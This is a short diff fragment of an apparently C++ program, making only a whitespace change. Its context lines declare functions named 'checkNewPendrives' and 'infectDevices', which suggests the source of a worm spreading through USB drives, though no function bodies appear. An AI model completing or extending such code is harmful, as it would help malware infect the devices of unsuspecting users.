@@ -2,7 +2,7 @@
 #include <time.h>
 #include <string>
 #include <fstream>
-
+ 
 using namespace std;
 char checkNewPendrives();
 void infectDevices(char devices);
